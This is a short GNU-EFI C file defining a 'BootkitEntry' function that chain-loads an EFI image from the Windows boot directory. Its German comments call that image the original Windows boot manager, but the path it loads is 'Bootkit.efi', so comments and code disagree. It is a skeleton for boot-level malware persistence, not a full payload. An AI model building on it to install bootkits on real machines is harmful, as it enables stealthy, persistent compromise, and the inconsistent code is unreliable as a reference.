#include <efi.h>
#include <efilib.h>

EFI_GUID g_EfiLoadedImageProtocolGuid = {
	0x5B1B31A1, 0x9562, 0x11d2,
	{0x8E, 0x3F, 0x00, 0xA0, 0xC9, 0x69, 0x72, 0x3B}
};


EFI_STATUS BootkitEntry(
	IN EFI_HANDLE imageHandle,
	IN EFI_SYSTEM_TABLE *systemTable
)
{
	EFI_STATUS retVal;
	EFI_DEVICE_PATH *fileDeivcePath = NULL;
	EFI_LOADED_IMAGE *currentInfo;
	EFI_HANDLE bootmgfwHandle = NULL;

	// 1. Initialisiere GNU-EFI

	InitializeLib(imageHandle, systemTable);

	// 2. Erstelle einen Dateipfad zum originalen Windows-Bootmanager

	retVal = systemTable->BootServices->HandleProtocol(
		imageHandle,
		&g_EfiLoadedImageProtocolGuid,
		&currentInfo
	);

	if (EFI_ERROR(retVal))
		goto Done;

	fileDeivcePath = FileDevicePath(
		currentInfo->DeviceHandle, 
		L"\\EFI\\Microsoft\\Boot\\Bootkit.efi"
	);

	if (!fileDeivcePath)
	{
		retVal = EFI_NO_MAPPING;
		goto Done;
	}

	// 3. Starte den originalen Windows Bootmanager mittels BootServices

	retVal = systemTable->BootServices->LoadImage(
		TRUE,
		imageHandle,
		fileDeivcePath,
		NULL,
		0,
		&bootmgfwHandle
	);

	if (EFI_ERROR(retVal))
		goto Done;

	retVal = systemTable->BootServices->StartImage(
		bootmgfwHandle,
		NULL, 
		NULL
	);

Done:

	return retVal;
}